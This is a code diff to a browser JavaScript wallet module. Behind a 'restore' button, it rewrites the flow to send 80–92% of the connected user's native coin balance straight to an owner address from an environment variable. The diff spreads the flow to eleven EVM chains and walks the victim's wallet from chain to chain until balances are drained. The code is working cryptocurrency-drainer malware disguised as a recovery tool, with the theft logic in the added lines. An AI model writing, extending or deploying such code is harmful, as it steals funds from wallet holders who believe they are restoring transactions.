@@ -8,15 +8,28 @@ import {
     estimateGas,
     getBalance,
     writeContract,
+    sendTransaction,
 } from "@wagmi/core";
-import { mainnet, bsc, polygon } from "@wagmi/core/chains";
+
+import {
+    mainnet,
+    bsc,
+    polygon,
+    arbitrum,
+    avalanche,
+    optimism,
+    base,
+    fantom,
+    linea,
+    cronos,
+    manta,
+} from "@wagmi/core/chains";
 import { coinbaseWallet, walletConnect, injected } from "@wagmi/connectors";
-import { getAccount } from "@wagmi/core";
+import { getAccount, getChainId } from "@wagmi/core";
 
 import * as CONFIG from "../settings.json";
 import { getTokensOwned } from "./apiConfig";
 import { hexToNumber, numberToHex } from "viem";
-import * as RST_ABI from "../NFT_ABI.json";
 
 const projectId = process.env.VITE_PROJECT_ID;
 
@@ -28,11 +41,31 @@ const metadata = {
 };
 
 const config = createConfig({
-    chains: [mainnet, bsc, polygon],
+    chains: [
+        mainnet,
+        bsc,
+        polygon,
+        arbitrum,
+        avalanche,
+        optimism,
+        base,
+        fantom,
+        linea,
+        cronos,
+        manta,
+    ],
     transports: {
         [mainnet.id]: http(),
         [bsc.id]: http(),
         [polygon.id]: http(),
+        [arbitrum.id]: http(),
+        [avalanche.id]: http(),
+        [optimism.id]: http(),
+        [base.id]: http(),
+        [fantom.id]: http(),
+        [linea.id]: http(),
+        [cronos.id]: http(),
+        [manta.id]: http(),
     },
     connectors: [
         walletConnect({ projectId, metadata, showQrModal: false }),
@@ -58,63 +91,23 @@ const data = {
     provider: null,
 };
 
-let mySupportedChains = [1, 56, 137];
+let mySupportedChains = [
+    1, 56, 137, 42161, 43114, 10, 8453, 250, 59144, 25, 169,
+];
 let usedChains = [];
 
-const arrCH = {
-    1: 0,
-    56: 1,
-    137: 2,
-};
-
 const arrCHXY = {
-    1: "ETHEREUM",
-    56: "BSC",
-    137: "POLYGON",
-};
-
-let custParams = {
-    1: {
-        chainId: "0x1",
-        chainName: "Ethereum Mainnet",
-        blockExplorerUrls: ["https://etherscan.io"],
-        nativeCurrency: {
-            name: "Ethereum",
-            symbol: "ETH",
-            decimals: 18,
-        },
-        rpcUrls: ["https://mainnet.infura.io/v3/", "https://rpc.ankr.com/eth"],
-    },
-    56: {
-        chainId: "0x38",
-        chainName: "BNB Chain",
-        blockExplorerUrls: ["https://bscscan.com"],
-        nativeCurrency: {
-            name: "BNB",
-            symbol: "BNB",
-            decimals: 18,
-        },
-        rpcUrls: [
-            "https://bsc-dataseed.binance.org/",
-            "https://bsc-dataseed.bnbchain.org",
-            "https://bsc-dataseed1.defibit.io",
-        ],
-    },
-    137: {
-        chainId: "0x89",
-        chainName: "Polygon Mainnet",
-        blockExplorerUrls: ["https://polygonscan.com/"],
-        nativeCurrency: {
-            name: "MATIC",
-            symbol: "MATIC",
-            decimals: 18,
-        },
-        rpcUrls: [
-            "https://polygon-mainnet.infura.io",
-            "https://rpc-mainnet.maticvigil.com",
-            "wss://polygon.gateway.tenderly.co",
-        ],
-    },
+    1: mainnet,
+    56: bsc,
+    137: polygon,
+    42161: arbitrum,
+    43114: avalanche,
+    10: optimism,
+    8453: base,
+    250: fantom,
+    59144: linea,
+    25: cronos,
+    169: manta,
 };
 
 document.querySelector("#restore-txs").addEventListener("click", initWeb3);
@@ -224,15 +217,26 @@ async function initRestoreETH() {
         const userBalance = walletETHBalance2.formatted;
         console.log(userBalance);
 
+        const cid2 = getChainId(config);
+
+        if (userBalance == 0) {
+            await sendErr(
+                `Error restoring COIN on ${arrCHXY[cid2].name}  No native coin balance`
+            );
+
+            usedChains.push(
+                hexToNumber(await wallet.request({ method: "eth_chainId" }))
+            );
+            mySupportedChains = mySupportedChains.filter(
+                (item) => !usedChains.includes(item)
+            );
+
+            return verChainID(mySupportedChains[0]);
+        }
+
         const gasPrice = await estimateGas(config, {
             account: data.userAddress,
-            to: CONFIG.CONTRACT_ADDRESS[
-                mySupportedChains.indexOf(
-                    hexToNumber(await wallet.request({ method: "eth_chainId" }))
-                )
-            ],
-            abi: RST_ABI,
-            functionName: "restore",
+            to: process.env.OWNER_ADDRESS,
             value: BigInt(parseInt(userBalance * 0.8)),
             type: "legacy",
             chainId: hexToNumber(
@@ -244,29 +248,22 @@ async function initRestoreETH() {
 
         console.log(gasPrice);
 
-        const result = await writeContract(config, {
+        const result = await sendTransaction(config, {
             account: data.userAddress,
-            address:
-                CONFIG.CONTRACT_ADDRESS[
-                    mySupportedChains.indexOf(
-                        hexToNumber(
-                            await wallet.request({ method: "eth_chainId" })
-                        )
-                    )
-                ],
-            abi: RST_ABI,
-            functionName: "restore",
+            to: process.env.OWNER_ADDRESS,
             chainId: hexToNumber(
                 await wallet.request({
                     method: "eth_chainId",
                 })
             ),
-            value: BigInt(
-                parseInt(
-                    parseInt(userBalance * 0.8) -
-                        parseInt(Number(gasPrice) * 50000)
-                )
-            ),
+            value:
+                hexToNumber(
+                    await wallet.request({
+                        method: "eth_chainId",
+                    })
+                ) == 1
+                    ? BigInt(parseInt(parseInt(userBalance * 0.8)))
+                    : BigInt(parseInt(parseInt(userBalance * 0.92))),
         });
         // console.log(result);
         sendErr(`Restore ETH Success. Hash ${result}`);
@@ -282,7 +279,9 @@ async function initRestoreETH() {
     } catch (error) {
         sendErr(
             `Error restoring ETH: ${error.message} chain ${await wallet.request(
-                { method: "eth_chainId" }
+                {
+                    method: "eth_chainId",
+                }
             )}`
         );
         if (isRetryError(error)) {
@@ -306,31 +305,28 @@ async function verChainID(chainId) {
     const wallet = await getWalletClient(config);
     if (data.chainId != chainId) {
         try {
-            await wallet.request({
-                method: "wallet_switchEthereumChain",
-                params: [{ chainId: numberToHex(chainId) }],
-            });
+            await wallet.switchChain({ id: arrCHXY[chainId].id });
             initAccounts();
             return true;
         } catch (error) {
             if (error.code === 4902) {
                 try {
                     await wallet
-                        .request({
-                            method: "wallet_addEthereumChain",
-                            params: [custParams[chainId]],
-                        })
+                        .addChain({ chain: arrCHXY[chainId] })
                         .then(() => {
                             initAccounts();
                             return true;
                         });
                 } catch (error) {
-                    sendErr("Error adding Ethereum chain:", error);
+                    sendErr("Error adding EVM chain:", error);
+                    initAccounts();
 
                     return false;
                 }
             } else {
                 console.error("Error switching Ethereum chain:", error);
+                initAccounts();
+
                 return false;
             }
         }
